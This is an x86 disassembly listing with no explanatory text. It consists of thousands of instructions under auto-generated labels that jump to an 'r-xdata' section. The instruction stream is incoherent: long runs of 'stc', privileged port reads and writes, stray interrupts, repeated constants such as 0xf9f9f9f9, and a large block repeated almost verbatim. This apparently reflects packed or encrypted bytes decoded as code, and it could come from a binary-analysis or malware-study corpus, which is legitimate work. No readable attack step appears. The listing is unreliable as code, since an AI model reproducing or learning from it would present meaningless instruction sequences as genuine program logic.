imul edi ecx 0x3885e23c
cmp [ esi ] bh
pop edx
xchg esi eax
sub [ esi - 0x69696c3 ] 0x3a
aas
pop edx
mov dl 0x80
retn
sub_484c6f
sub ch [ ecx + 0x69 ]
stc
stc
stc
stc
stc
stc
stc
stc
in al dx
mov al [ 0xffffffff96979880 ]
xchg esi eax
loopne r-xdata
stc
stc
push ecx
pavgb mm4 [ edi + ebp * 4 ]
shl [ edx ] 0xf
loopne r-xdata
xor al [ ebx ]
sbb cl [ edi ]
loopne r-xdata
add ebx [ 0xffffffffcf34e00f ]
push ebp
or [ ebp + 0x169697d ] 0x9e6d61d8
loopne r-xdata
xor al [ ebx ]
sbb eax 0xcf34e00f
xor [ edi ] cl
loopne r-xdata
add dl ah
mov bh 0x30
pavgb mm6 [ ebx * 8 - 0x1ff04e1e ]
sub al 0xb9
pavgb mm4 [ ecx ]
retn
pavgb mm6 [ ebx + eax * 8 ]
loop r-xdata
stc
stc
stc
stc
stc
or dh 0x2b
sub [ ecx + 0x69697dbf ] eax
add [ edx + ebx * 4 ] ecx
sahf
or bh 0x7a
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loopne r-xdata
fucom st2
mov cl 0xf
loopne r-xdata
imul ebp [ ecx + 0x32 ] 0xe00f1d03
xor al 0xcf
or dh 0x2b
pop edx
test eax 0xdf34e00f
sbb [ ebx + 0x169697d ] 0xfdaa4710
loopne r-xdata
add ecx [ edx ]
pavgb mm6 [ eax * 8 + 0x34e00f32 ]
mov [ ebx ] 0x24e00f1a
xlat
xor [ ebx ] al
sbb eax 0xab24e00f
xor [ ebx ] al
sbb al 0xf
loopne r-xdata
stc
stc
stc
test eax 0x52696969
stosb [ edi ]
in al dx
outsb
push 0x25806969
aas
imul ebp [ ecx - 0x7 ] 0x6080bfe2
jpo r-xdata
stc
stc
loop r-xdata
mov ecx 0xa124e00f
pavgb mm5 [ ebx + edi * 4 ]
and [ ebx - 0x699696d3 ] 0x3f
mov eax [ 0xffffffffa95aa1e2 ]
pavgb mm6 [ edi + ebx * 8 ]
lodsd [ esi ]
loop r-xdata
push edi
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
imul edi ecx 0x6966cd80
imul edi ecx 0xf9f9f9f9
iretd
pavgb mm6 [ ecx + ebx * 8 ]
loop r-xdata
stc
stc
stc
stc
stc
add [ ebp + 0x68 ] ebp
imul ebp [ ecx - 0x1c ] 0x969435ec
xchg esi eax
or [ edi + ebp + 0x69 ] 0x69
stc
stc
or eax 0x91eaa05a
xchg esi eax
cmp [ ebp - 0x69696a8 ] 0xf9
mov [ 0xffffffff9669692d ] eax
aas
pavgb mm7 [ ebx + eax ]
pavgb mm4 [ eax + 0x694c9a80 ]
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
stc
cmp dl [ esi - 0x1694ae4 ]
int 0x69
imul ebp [ ecx - 0x80 ] 0x696967b6
stc
cmp al 0xe2
test [ esi ] edi
add ebp [ ebp + 0x1 ]
imul ebx [ ecx + 0x69 ] 0x651c9669
add ebp [ ecx - 0x80 ]
into
inc ecx
imul ebp [ ecx - 0x7 ] 0x962e3af9
jpe r-xdata
xor [ edi ] cl
loopne r-xdata
inc ebp
imul ebp [ ecx + 0x69 ] 0x392d2ce4
loop r-xdata
xchg esi eax
test al 0x86
imul eax [ eax + 0x69693cab ] 0xfffffff9
stc
stc
stc
add [ ecx - 0x17 ] ebp
imul ebp [ ecx + 0x3 ] 0x4d1d9669
inc ecx
xchg esi eax
aas
sbb eax 0x794d2de2
push 0x96714d2d
sub eax 0x7180754d
imul ebp [ gs : ecx - 0x7 ] 0x69401280
imul esp edx 0x1c96612c
jns r-xdata
stc
loop r-xdata
stc
stc
stc
aas
loop r-xdata
cmp [ eax ] 0x30696920
in al dx
test eax 0x69573d80
imul edi ecx 0xf9f9f9f9
imul edi ecx 0xf9f9f9f9
stc
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
fisttp [ edi ]
loopne r-xdata
stc
stc
stc
stc
stc
stc
in ax dx
inc ebx
inc ebp
imul ebp [ ecx + 0x5a ] 0xf9aaa0a9
stc
stc
stc
rsqrtps xmm4 [ esi + 0x696fec66 ]
imul ebp [ ecx - 0x16 ] 0x81ea6bab
imul ebp esp 0xffffffa9
in ax dx
mov edi [ ecx + ebp * 2 ]
imul esp edx 0x6c88a8a7
loop r-xdata
sbb al 0x65
sub dl 0x75
imul ebp [ ecx + 0x3e ] 0x696b45d6
imul edi [ esi ] 0x94bdece4
xchg esi eax
xchg esi eax
cmp bh [ ecx ]
xor [ ecx - 0x15969697 ] 0x33a65ad
imul edx [ esi - 0x2e7f9ac1 ] 0x50
imul ebp [ ecx - 0x7 ] 0xaef9f9f9
sub al 0x9d
sbb al 0x1a
or al 0x1b
xrstor [ ecx + edx * 4 ]
pop edx
pop ebx
add [ eax - 0x69696d1 ] 0xf9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loop r-xdata
stc
stc
stc
imul edx [ esi - 0x5fa5f2c1 ] 0x809691ea
mov ebp 0xf9696958
stc
add eax [ eax ]
loop r-xdata
scasd [ edi ]
test eax 0x696ded66
imul ebp [ ecx + 0x39 ] 0xea613f96
adc ch [ ecx ]
imul esp [ esi - 0x13 ] 0x69697e88
add ebp [ ecx + 0x1 ]
cwde
je r-xdata
cmp [ edx + 0x3d ] edx
popad
cmp [ esi - 0x11 ] esp
push 0x69
imul ebp [ ecx - 0x20 ] 0x74809534
and ch [ ecx + 0x69 ]
stc
stc
cmp al 0xe2
test [ eax + 0x69695a76 ] eax
stc
stc
xor eax [ eax + 0x69692175 ]
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
add [ esi - 0x1d96969f ] 0xec305d2a
sub [ esi + 0x6969addf ] edx
imul eax [ eax + 0x69697edd ] 0xe065adea
adc eax 0x813f7d4d
lea edi [ ecx + ebp * 2 ]
imul esi [ eax ] 0x754d2de0
push edx
stosb [ edi ]
in ax dx
0x3a69696c 0x9801
sub_484fd4
imul eax [ ecx ] 0xd8aac665
loopne r-xdata
sbb al 0x61
cmp [ edi + 0x69 ] 0x69
stc
stc
stc
stc
stc
jne r-xdata
imul eax [ ecx ] 0xaf1da5a4
loopne r-xdata
0xe8099a8 0x9697
imul ebp [ ecx + 0x3a ] 0x6962a480
imul ecx [ edi ] 0x80b124e0
int1
js r-xdata
loopne r-xdata
in eax 0x69
imul ebp [ ecx - 0x7f ] 0x696979d6
add [ ebx + 0x3e3130e6 ] ecx
loopne r-xdata
das
fisubr [ edi ]
outsd
or al 0x62
imul ebp [ ecx - 0x7 ] 0xea6ba8ea
stosd [ edi ]
imul ecx [ edi ] 0xffffffec
test eax 0x6940c480
imul edi ecx 0xe439f9f9
sub al 0x9d
xor [ ebx - 0x69696bd ] 0xe4
in al dx
mov eax [ 0x39969694 ]
in al 0xec
fst [ ecx - 0x7fc6696a ]
cmc
inc eax
imul ebp [ ecx - 0x7 ] 0x81792fe0
lodsb [ esi ]
js r-xdata
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
salc
daa
sbb eax 0xcb806969
xchg esp eax
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in al 0x2a
jns r-xdata
outsb
imul eax [ ecx ] 0xc6b78a4
loopne r-xdata
sub [ ecx - 0x696968e ] 0xf9
xor eax 0x6979b981
loop r-xdata
int1
imul ebp [ ecx + 0x69 ] 0x69471280
imul edi ecx 0x24e00ff9
lahf
xor [ eax + 0x696972a9 ] al
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pop edx
mov al [ 0x5b80a9ec ]
outsd
imul ebp [ ecx - 0x7 ] 0x616901f9
imul ebp [ ecx - 0x1c ] 0x969cc9ec
xchg esi eax
cmp bh [ ecx ]
sub [ esi + edx * 4 - 0x6a ] 0x65adea96
add cl 0x6e
stc
imul ebp edx 0x970129ad
or [ edx ] ecx
test [ esi ] bh
loopne r-xdata
mov al [ 0xfffffffff9f9f9aa ]
stc
aaa
dec ecx
xor [ edi + esi * 2 + 0x69 ] 0x69
stc
stc
stc
stc
stc
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
in al 0x24
mov eax [ 0xffffffff80c12ce4 ]
fnstcw [ ebx ]
imul ebp [ ecx - 0x7 ] 0xa601f9f9
adc [ ecx - 0x79 ] 0x3e
add ebp [ ecx - 0x6a ]
aas
adc edx esp
xchg ecx eax
in al dx
xchg esi eax
or dh 0x71
imul ebp [ ecx - 0x7 ] 0x9694a480
stc
sub ecx 0x66696938
fisubr [ edi ]
imul edi ecx 0xf9f9f9f9
jge r-xdata
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
cmp al 0xe2
test [ eax ] edi
cmp bh [ edi ]
sbb [ eax ] 0xec696960
test eax 0x9691ef80
xchg esi eax
stc
cmp [ edx ] edi
loopne r-xdata
xchg esi eax
mov ecx 0x96969694
r-xdata
stc
stc
stc
stc
stc
stc
stc
cmp al 0xe2
test [ eax ] edi
cmp [ ebx - 0x699696c7 ] 0x3f
insd
loop r-xdata
fnstsw [ eax + 0x69 ]
imul eax [ ecx ] 0xbc7712ed
loopne r-xdata
loopne r-xdata
stc
add [ esi + 0x3e875182 ] esp
pop ebx
jb r-xdata
in ax dx
insd
imul ebp [ ecx + 0x69 ] 0x613f9639
0x66692912 0x88ed
pop es
xchg ebx eax
xchg esi eax
xchg esi eax
stc
xchg esi eax
r-xdata
add ecx [ 0xffffffffd9ff963e ]
imul ebp [ ecx + 0x69 ] 0x62a4803a
imul ebp [ ecx + 0xf ] 0x80b124e0
outsd
sub [ ecx - 0x69696d5 ] 0xf9
stc
stc
stc
cmp [ esi + 0x7c80611c ] edx
daa
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
das
jno r-xdata
cmp edx esp
scasd [ edi ]
cmp [ ecx - 0x70 ] 0xadea9696
loopne r-xdata
imul edi ecx 0x8068e20d
imul ebp [ ecx - 0x6a ] 0x91e26d3f
iretd
stc
stc
stc
stc
add edx [ ecx ]
xor [ eax + 0x6969746c ] eax
dec ebp
dec ecx
in al dx
test eax 0x95caed66
xchg esi eax
xchg esi eax
loop r-xdata
xchg esi eax
0x2de065ad 0x494d
imul ebp [ ecx - 0x7 ] 0xe00ff9f9
xor al 0xcd
and bl 0x92
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
loop r-xdata
imul edi ecx 0x696b11e9
sbb [ ecx + 0x28 ] 0x69
imul edi ecx 0xf9f9f9f9
stc
stc
xor ah ch
test eax 0x6d48ec66
imul ebp [ ecx - 0x1c ] 0xe239b92c
sub al 0x61
sbb [ ebp + 0x2c ] 0xec306969
test eax 0x6d65ec66
imul ebp [ ecx - 0x60 ] 0xf9f9f9aa
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
cmp dl [ esi + 0x6969c5ff ]
imul eax [ ecx ] 0x69696996
cmp bh [ edi ]
adc [ ebx - 0x6c ] 0x93809696
xchg ebp eax
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
add edx 0xea69692b
lodsd [ esi ]
in al dx
test eax 0x7beded66
imul ebp [ ecx + 0x5a ] 0x178029a9
jpo r-xdata
dec ebp
jno r-xdata
cmp edx esp
sub eax 0xa081414d
imul ebp [ es : ecx + 0x30 ] 0x951b8030
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
imul ebp [ ecx - 0x16 ] 0x2ce471ad
fld [ eax + 0x696975f5 ]
xchg esi eax
aas
pop ecx
in al 0xec
mov eax [ 0x39969694 ]
xchg esi eax
aas
inc ebp
push ecx
xor al 0x79
in al dx
pop es
lahf
xchg esi eax
xchg esi eax
add [ edi ] 0x22
imul ebp [ ecx - 0x7 ] 0x39f9f9f9
fisubr [ edx ]
or eax 0x2ae20f39
inc edi
punpckhdq mm5 [ 0xffffffffde664d4d ]
test eax 0x81afe239
jns r-xdata
xor [ eax + 0x69692028 ] eax
pop edx
mov dl 0x52
0x7ee3ec66 0x6969
cmp dl [ esi + 0x6969c57c ]
imul eax [ eax + 0x696942bb ] 0xe00ff9f9
cmp al 0xb3
xor eax [ ebx ]
sbb [ edi ] ecx
loopne r-xdata
stc
or [ edx + ecx * 2 + 0x69 ] 0x69
stc
stc
cmp al 0xe2
test eax ebp
test [ 0xffffffff8069696d ] edx
outsd
pushfd
xchg esi eax
xchg esi eax
add ebx [ edx ]
pavgb mm5 [ ecx + esi * 4 ]
xor [ ebx ] eax
or cl [ edi ]
loopne r-xdata
mov ch 0x80
int3
stc
stc
stc
stc
stc
stc
stc
xchg esi eax
fisubr [ ebp - 0x7e969697 ]
loopne r-xdata
sbb eax 0xae6a794d
jpe r-xdata
imul ebp [ ecx - 0x7 ] 0x8068e20d
xchg esi eax
cmp [ eax + 0x69697413 ] eax
mov bl 0xe2
test al 0xf
loopne r-xdata
xchg esi eax
loopne r-xdata
popad
jmp 0xffffffffe2b1bcd1
in al dx
xor [ ebp + 0x69 ] edi
imul esp esp 0x9694a1ec
xchg esi eax
cmp [ eax + 0x69694897 ] eax
xor [ eax + 0x69696820 ] al
stc
stc
stc
stc
stc
stc
stc
stc
xchg esi eax
inc ebp
imul ebp [ ecx + 0x69 ] 0x9491e4e4
xchg esi eax
xchg esi eax
add edi 0xea69695e
xchg ecx eax
sub [ esi - 0x15 ] esp
popad
imul ebp [ ecx + 0x69 ] 0xff966903
lds ebp [ ecx + 0x69 ]
imul esp esp 0x969491e4
xchg esi eax
sbb [ ebx - 0x70 ] 0xefe29696
aad 0x69
imul ebp [ ecx - 0x1e ] 0x6969a9e7
imul eax [ eax ] 0x6969eda9
imul esp edx 0x9694b5fc
mov ch 0x31
add eax [ edi + 0x36 ]
or [ edi ] 0x59
imul ebp [ ecx + 0x3 ] 0x80b7e21b
adc [ edi - 0x606696a ] ebx
in ax dx
cld
xchg ebp eax
xchg esi eax
xchg esi eax
loop r-xdata
imul ebp [ ecx + 0x69 ] 0x94b5fce2
xchg esi eax
inc edx
push 0xf9f9f9aa
stc
stc
stc
sub_485461
push 0xf9f96969
stc
stc
stc
stc
stc
pavgb mm5 [ edi + ecx * 4 ]
pavgb mm4 [ ecx + ecx * 4 ]
xor ah ah
sub al 0x81
cmp edx esp
sub al 0x61
xor [ ebx + ebp ] 0x69
imul edi ecx 0xea0ff9f9
push ecx
imul eax [ eax + 0x69697975 ] 0xf9f9f9f9
stc
stc
stc
stc
xchg esi eax
sbb [ ebp - 0x6a ] esp
sbb [ ecx - 0x1e ] esp
scasb [ edi ]
adc [ ebx + 0x60 ] 0x30306969
pop edx
test eax 0x696bc180
imul edx [ esi + 0x3550613f ] 0xed667d4d
out 0x62 eax
imul ebp [ ecx - 0x2a ] 0x696908c1
scasb [ edi ]
sub eax 0x53f1714d
imul ebp [ ecx + 0x3 ] 0x5969016d
imul ebp [ ecx - 0x80 ] 0x6969731d
stc
stc
stc
stc
in ax dx
insb
imul ebp [ ecx + 0x69 ] 0xe00fa05a
popad
stosb [ edi ]
stc
stc
stc
stc
stc
stc
stc
stc
stc
cmp dl [ esi - 0x55adc6c2 ]
in ax dx
0x9691
sub_485666
test al 0x80
adc [ eax + 0x69 ] ebx
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pop edx
test eax 0x6966ad80
imul edi ecx 0xc581f9f9
imul ebp [ fs : ecx - 0x80 ] 0x69696a6b
cmp bh [ edx ]
in al 0xec
leave
xchg esp eax
xchg esi eax
xchg esi eax
cmp [ esi - 0x69c5c6c2 ] edx
inc ch
imul ebp [ ecx + 0x69 ] 0x3e960d03
popad
stc
out dx ax
mov edi 0xea69697c
or eax 0xe4694d4d
sub eax 0x66394d4d
fisubr [ esi + 0x39 ]
popad
loop r-xdata
jl r-xdata
pavgb mm6 [ edi ]
loop r-xdata
cmp ch 0x90
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
xchg esi eax
inc [ ebp - 0x1b969697 ]
in al dx
lodsd [ esi ]
xchg ebp eax
xchg esi eax
xchg esi eax
cmp [ ecx + 0x69692c96 ] eax
sub [ ecx ] edi
and [ ebp - 0x69696be ] 0x66
in al dx
xchg edx eax
imul ebp [ bx + di + 0x5a ] 0x98ca80a9
xchg esi eax
xchg esi eax
stc
stc
stc
stc
xor cl [ edi ]
loopne r-xdata
lds ebp [ ecx + 0x69 ]
imul eax [ ebx ] 0x613e960d
adc [ ebp - 0x1f969692 ] 0x2c
and edx 0x2ce09d2c
test [ edx - 0x57 ] ebx
pop edx
mov ebx 0xe2952ce0
and al 0x95
loop r-xdata
in al dx
test eax 0x6964ec66
imul ebp [ ecx - 0x7f ] 0x6969786b
in al dx
test eax 0x696ded66
imul ebp [ ecx - 0x20 ] 0x3f7d4d15
imul ebp edx 0x694d4d0d
in al 0x2d
dec ebp
dec ebp
cmp [ esi - 0x22 ] esp
outsb
cmp [ edi ] ecx
loop r-xdata
psrad mm5 [ esi ]
imul esp esp 0x394d4d2d
fisubr [ esi + 0x39 ]
sub esi 0x30696940
in al dx
test eax 0x9e36ed66
xchg esi eax
xchg esi eax
sub [ eax ] 0x93
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
xor [ ebx ] eax
dec esp
pavgb mm5 [ eax * 4 - 0x7ffffccf ]
mov edx 0x3f696978
loop r-xdata
pavgb mm6 [ ecx + edi * 2 ]
sbb [ ebx + 0x23 ] 0x69
imul esp eax 0x817d4d35
and esp [ eax + 0x69 ]
imul ebx [ edx - 0x6a ] 0x66a9ec2e
in al dx
imul ebp [ fs : ecx + 0x69 ] 0x69786b81
imul ebp esp 0x6ded66a9
imul ebp [ ecx + 0x69 ] 0x7d4d15e0
aas
stc
stc
in al 0x8d
sub dh 0x21
imul ebp [ ecx - 0x7 ] 0x1f96f9f9
pop ebp
xor [ esi + 0x2f ] 0x69
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
stc
loop r-xdata
in al dx
lahf
in ax dx
dec ebp
jb r-xdata
stc
stc
stc
stc
stc
stc
stc
imul ecx [ edi ] 0x6a
sub eax 0xde66494d
test eax 0x695c3d80
imul edi ecx 0x5af9f9f9
test eax 0xa0323736
stosb [ edi ]
sub [ eax + 0x69692f99 ] eax
stc
stc
stc
pavgb mm7 [ ebp + 0x67 ]
xor [ edi ] 0x41
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
imul edi ecx 0x24e00ff9
cdq
loop r-xdata
imul ebx [ edx - 0x60 ] 0x3ea14228
loop r-xdata
stc
stc
add eax [ edi + 0xf ]
loopne r-xdata
iretd
imul esi [ eax ] 0xec66a9ec
stc
stc
stc
stc
aas
or [ eax + 0x69 ] 0xa9ec3069
in al dx
dec ebp
add [ gs : edi ] 0x46
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
sub al 0x95
in al dx
test eax 0x95d5ed66
fwait
xor [ edi ] cl
loopne r-xdata
xchg esi eax
xchg esi eax
cmp [ esi ] edi
xchg esi eax
aas
or edx esp
mov cl 0xec
mov dl 0x66
in eax dx
les edx [ ebp + 0x1c969696 ]
xchg ebp eax
xchg esi eax
jmp ecx
in eax dx
aad 0x95
popfd
loop r-xdata
in al dx
test eax 0x97cfec66
xchg esi eax
xchg esi eax
add [ ebp + 0x68 ] ebp
imul ebp [ ecx - 0x1c ] 0x9694c9ec
xchg esi eax
cmp [ ecx - 0x696969e ] 0xf9
0xde666ba9 0xea59
pavgb mm5 [ ebx + edx * 4 ]
pop edx
test eax 0xe00f1103
sub al 0x95
or [ ebx ] 0x91
xchg esi eax
xchg esi eax
stc
stc
stc
xchg esi eax
sub_485c0d
push eax
sub ch [ edi ]
in ax dx
into
imul ebp [ bx + di - 0x2a ] 0x696962d1
cmp esp esp
sub al 0xc1
cmp [ edx ] edi
cmp al [ ebx ]
dec ecx
cmp bh [ edx ]
adc cl 0x93
xchg esi eax
xchg esi eax
stc
xchg esi eax
inc ebp
imul ebp [ ecx + 0x69 ] 0x69e96901
imul eax [ ebx ] 0x4d1d9669
dec ecx
xchg esi eax
aas
sbb eax 0x7d4d2d96
loop r-xdata
cmp [ edi ] 0x29
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
stc
stc
in al dx
mov edi 0x80696921
jg r-xdata
and [ ebx ] 0x85
xchg esi eax
xchg esi eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
loop r-xdata
popad
dec ebp
jge r-xdata
pop ecx
sub ch [ ecx + 0x69 ]
stc
stc
sub [ ebx - 0x7f696962 ] 0x6969546d
stc
stc
stc
stc
stc
imul ebp [ ecx + 0xf ] 0xe3806852
lahf
xchg esi eax
xchg esi eax
stc
stc
push 0x2c
xchg ebp eax
sub [ edi ] 0x87
xchg esi eax
xchg esi eax
stc
stc
stc
cmp al 0xe2
test [ eax - 0x6969793a ] eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pop edx
test eax 0xaaa03237
stc
stc
stc
in ax dx
in eax 0x2a
imul ebp [ ecx + 0x3e ] 0xd5806d03
test [ esi + 0x2c50f996 ] edx
xchg ebp eax
cld
test eax 0xf9f9aaa0
stc
stc
pop edx
test eax 0xf9aaa029
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
loopne r-xdata
insd
jmp r-xdata
stc
stc
stc
in al 0xec
mov ecx 0x80969694
mov bl [ edx + 0x3e3e9696 ]
cmp al [ eax - 0x69696e9a ]
stc
stc
stc
stc
stc
stc
stc
call 0x69b396c7
imul edi [ esi ] 0x692a9280
imul edi ecx 0xf9f9f9f9
stc
stc
test [ ebx ] esi
pavgb mm7 [ edi + eax * 4 ]
add [ ebp - 0x669696f ] 0xf9
stc
stc
stc
stc
stc
stc
stc
stc
add [ ebx ] 0x46
pavgb mm7 [ eax * 4 + 0x3ce00f33 ]
xchg [ eax - 0x69696e7b ] eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
add ebx [ ebx ]
pavgb mm7 [ ebx + eax * 4 ]
xor eax [ ebx ]
sbb al 0xf
loopne r-xdata
xchg ecx eax
sbb [ ecx + 0x2a ] 0x69
imul edi ecx 0x9eab81f9
xchg esi eax
xchg esi eax
sub [ ebp + 0x54 ] 0x69
imul edi ecx 0xf9f9f9f9
push eax
sub eax 0xed66754d
insd
imul ebp [ ecx + 0x69 ] 0x613f963e
bound ebp [ ecx + 0x69 ]

xchg ecx eax
sbb [ edi - 0x6696969 ] 0x1
xor bl [ ebx ]
cdq
loopne r-xdata
imul ebp [ ecx + 0x3 ] 0x2ce00f0d
xor [ ecx ] 0x697d6a80
imul edi ecx 0xf9f9f9f9
stc
loop r-xdata
inc esi
int 0x69
imul ebp [ ecx - 0x80 ] 0x96969fe0
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
pavgb mm4 [ edi + ebx * 4 ]
loop r-xdata
and eax 0x696d6f81
imul esp edx 0xef0d01b1
0x37e03e1c 0x8121
lahf
push 0x69
imul esp eax 0xcb015d2f
iretd
stc
stc
stc
stc
stc
cmp [ esi + 0x61e29519 ] dl
push 0x24
pavgb mm4 [ ecx + edx * 4 ]
xor [ edi ] cl
loopne r-xdata
add dl 0x51
imul ebp [ ecx - 0x7 ] 0x24d52cae
and al 0x31
or al 0xae
sub al 0xa9
pop es
aas
and al 0x24
scasb [ edi ]
sub al 0xa1
sbb [ ebx ] ebx
add eax 0xa52cae49
add [ eax ] edx
sbb [ esi + ebp * 4 ] ecx
sub al 0xb9
sbb ebx [ edi ]
dec ecx
dec ecx
add ebx 0x3669694c
aaa
xor ch ah
test eax 0x97e2ed66
xchg esi eax
xchg esi eax
in al 0x24
mov cl 0xe4
sub al 0xc1
cmp ebp 0xec69694c
test eax 0x9711ed66
xchg esi eax
xchg esi eax
or [ ebx ] 0x9b
xchg esi eax
xchg esi eax
stc
cmp esp esp
sub al 0xb9
cmp [ eax - 0x69697cf6 ] eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
sbb [ edx + 0x6a ] 0x91016969
movsd [ edi ] [ esi ]
push esi
and [ esi ] bh
loopne r-xdata
xchg ebx eax
add ecx [ ebx ]
loop r-xdata
jns r-xdata
insd
adc [ esi ] 0x6a
imul ebp [ ecx - 0x7f ] 0x69692a48
adc dh 0x70
imul ebp [ ecx - 0x7 ] 0x1550965a
dec ebp
pop ebp
in al dx
arpl [ ecx + 0x69 ] bp
imul edx [ eax + 0x15 ] 0xed66594d
popad
loop r-xdata
pavgb mm4 [ edx * 4 - 0x1ff05fa6 ]
and al 0x97
xor [ ebx ] al
or eax 0xb924e00f
sbb [ edi + 0x57 ] 0x69
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
insb
imul ebp [ ecx + 0x69 ] 0x6929dd81
imul esp eax 0xea794d15
imul ebp [ ecx + 0x50 ] 0x66594d15
in eax dx
adc eax 0x9668454d
sbb bl [ ecx - 0x1e ]
xchg edi eax
xchg esi eax
sbb eax 0xec664d4d
mov ss [ edx + 0x69 ]
imul eax [ eax + 0x69696385 ] 0xf9f9f9f9
stc
or [ ebx ] 0x66
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
in al 0xec
fst [ ecx - 0x617f696a ]
pop eax
imul ebp [ ecx - 0x7 ] 0x3f96f9f9
and edx esp
mov cl 0xec
mov dl 0x66
in eax dx
sub [ eax + 0x69 ] dl
imul eax [ ecx ] 0xf78c3046
cmp ah al
idiv [ ecx - 0x7e969697 ]
int3
sub_485d8b
or [ edx + 0x6a81813e ] al
imul ebp [ ecx + 0x1 ] 0x4b0d26bc
or [ edx - 0x6696979 ] 0xf9
stc
stc
stc
stc
stc
cmp [ esi + 0x61e29519 ] dl
push 0x24
pavgb mm4 [ ecx + edx * 4 ]
xor [ edi ] cl
loopne r-xdata

xchg ecx eax
sbb [ edi - 0x6696969 ] 0x1
xor bl [ ebx ]
cdq
loopne r-xdata
add dl 0x51
imul ebp [ ecx - 0x7 ] 0x24d52cae
and al 0x31
or al 0xae
sub al 0xa9
pop es
aas
and al 0x24
scasb [ edi ]
sub al 0xa1
sbb [ ebx ] ebx
add eax 0xa52cae49
add [ eax ] edx
sbb [ esi + ebp * 4 ] ecx
sub al 0xb9
sbb ebx [ edi ]
dec ecx
dec ecx
add ebx 0x3669694c
aaa
xor ch ah
test eax 0x97e2ed66
xchg esi eax
xchg esi eax
in al 0x24
mov cl 0xe4
sub al 0xc1
cmp ebp 0xec69694c
test eax 0x9711ed66
xchg esi eax
xchg esi eax
or [ ebx ] 0x9b
xchg esi eax
xchg esi eax
stc
cmp esp esp
sub al 0xb9
cmp [ eax - 0x69697cf6 ] eax
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
sbb [ edx + 0x6a ] 0x91016969
movsd [ edi ] [ esi ]
push esi
and [ esi ] bh
loopne r-xdata
xchg ebx eax
add ecx [ ebx ]
loop r-xdata
stc
stc
stc
stc
stc
stc
stc
stc
stc
pavgb mm4 [ edi + ebx * 4 ]
loop r-xdata
stc
stc
and eax 0x696d6f81
imul esp edx 0xef0d01b1
0x37e03e1c 0x8121
lahf
push 0x69
imul esp eax 0xcb015d2f
iretd
jns r-xdata
insd
adc [ esi ] 0x6a
imul ebp [ ecx - 0x7f ] 0x69692a48
adc dh 0x70
imul ebp [ ecx - 0x7 ] 0x1550965a
dec ebp
pop ebp
in al dx
arpl [ ecx + 0x69 ] bp
imul edx [ eax + 0x15 ] 0xed66594d
popad
loop r-xdata
pavgb mm4 [ edx * 4 - 0x1ff05fa6 ]
and al 0x97
xor [ ebx ] al
or eax 0xb924e00f
sbb [ edi + 0x57 ] 0x69
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
insb
imul ebp [ ecx + 0x69 ] 0x6929dd81
imul esp eax 0xea794d15
imul ebp [ ecx + 0x50 ] 0x66594d15
in eax dx
adc eax 0x9668454d
sbb bl [ ecx - 0x1e ]
xchg edi eax
xchg esi eax
sbb eax 0xec664d4d
mov ss [ edx + 0x69 ]
imul eax [ eax + 0x69696385 ] 0xf9f9f9f9
stc
or [ ebx ] 0x66
imul ebp [ ecx - 0x7 ] 0xf9f9f9f9
stc
stc
in al 0xec
fst [ ecx - 0x617f696a ]
pop eax
imul ebp [ ecx - 0x7 ] 0x3f96f9f9
and edx esp
mov cl 0xec
mov dl 0x66
in eax dx
sub [ eax + 0x69 ] dl
imul eax [ ecx ] 0xf78c3046
cmp ah al
idiv [ ecx - 0x7e969697 ]
int3
sub_486bca
imul edi ecx 0xf9f9f9f9
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
xchg esi eax
sbb al 0x61
sub [ ebx - 0x74 ] 0x30309696
mov al [ 0xfffffffff9f9f9aa ]
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
stc
xor [ ecx + esi * 2 + 0x69 ] 0x69
stc
stc
stc
stc
stc
stc
pop edx
test eax 0x84d38037
xchg esi eax
xchg esi eax
stc
stc
stc
stc
inc edx
test al 0xb8
xchg ecx eax
stosb [ edi ]
rol [ esi + edx * 4 - 0x606066a ] cl
mov cl 0x94
xchg esi eax
xchg esi eax
push edx
sub al 0x61
in ax dx
clc
